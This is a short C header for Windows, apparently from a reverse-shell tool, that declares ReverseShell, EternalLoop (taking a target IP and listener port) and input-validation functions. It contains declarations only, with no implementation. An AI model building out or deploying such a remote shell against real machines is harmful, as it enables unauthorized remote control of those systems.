#ifndef USERCOMMANDS_H
#define USERCOMMANDS_H

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#pragma comment(lib, "windowscodecs.lib")

void ReverseShell(SOCKET sock);
void EternalLoop(const char* targetIP, const uint16_t listenerPort);
int port_Validation(const uint16_t PORT);
int ip_Validation(const char* IP);

#endif // USERCOMMANDS_H